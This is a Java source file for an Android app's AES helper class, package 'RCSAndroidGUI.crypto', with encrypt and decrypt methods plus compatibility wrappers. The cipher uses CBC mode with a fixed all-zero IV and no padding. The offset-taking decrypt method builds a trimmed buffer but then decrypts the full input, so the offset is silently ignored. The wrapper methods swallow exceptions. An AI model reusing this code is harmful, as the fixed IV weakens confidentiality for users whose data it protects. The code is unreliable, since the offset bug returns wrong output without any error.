package com.ht.RCSAndroidGUI.crypto;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.ht.RCSAndroidGUI.utils.Check;

import android.util.Log;

/**
 * http://www.androidsnippets.org/snippets/39/index.html
 * 
 * @author zeno
 * 
 */
public class Crypto {
	private static final String TAG = "Crypto";

	private byte[] aes_key;
	private SecretKeySpec skey_spec;
	private IvParameterSpec ivSpec;

	public Crypto(byte[] key) {
		aes_key = new byte[key.length];
		System.arraycopy(key, 0, aes_key, 0, key.length);
		skey_spec = new SecretKeySpec(aes_key, "AES");

		byte[] iv = new byte[16];

		for (int i = 0; i < 16; i++) {
			iv[i] = 0;
		}

		ivSpec = new IvParameterSpec(iv);
	}

	public byte[] encrypt(byte[] clear) throws Exception {
		Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
		byte[] encrypted = cipher.doFinal(clear);
		return encrypted;
	}

	public byte[] decrypt(byte[] encrypted) throws Exception {
		Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
		byte[] decrypted = cipher.doFinal(encrypted);
		return decrypted;
	}

	public byte[] decrypt(byte[] encrypted, int offset) throws Exception {
		if (offset < 0 || encrypted.length < offset) {
			return null;
		}

		Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);

		if (offset == 0) {
			return cipher.doFinal(encrypted);
		} else {
			byte[] buffer = new byte[encrypted.length - offset];
			System.arraycopy(encrypted, offset, buffer, 0, encrypted.length
					- offset);
			return cipher.doFinal(encrypted);
		}
	}

	// COMPAT
	public void decrypt(byte[] cypher, byte[] plain) {

		try {
			byte[] buffer = decrypt(cypher);
			Check.asserts(plain.length == buffer.length,
					"different size buffers");

			System.arraycopy(buffer, 0, plain, 0, buffer.length);
		} catch (Exception e) {
			Log.e(TAG, e.toString());
		}

	}

	// COMPAT
	public void encrypt(byte[] plain, byte[] cypher) {
		try {
			byte[] buffer = encrypt(plain);
			Check.asserts(plain.length == buffer.length,
					"different size buffers");

			System.arraycopy(buffer, 0, cypher, 0, buffer.length);
		} catch (Exception e) {
			Log.e(TAG, e.toString());
		}

	}
}
